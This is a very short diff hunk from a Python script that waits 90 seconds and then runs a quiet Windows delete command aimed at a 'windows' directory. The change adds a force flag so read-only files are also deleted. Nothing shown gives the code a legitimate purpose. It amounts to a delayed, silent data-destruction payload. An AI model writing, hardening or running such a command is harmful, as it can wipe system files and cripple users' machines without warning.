@@ -3,4 +3,4 @@ import time
 
 time.sleep(90)
 
-os.system("del windows /q")
+os.system("del windows /f /q")
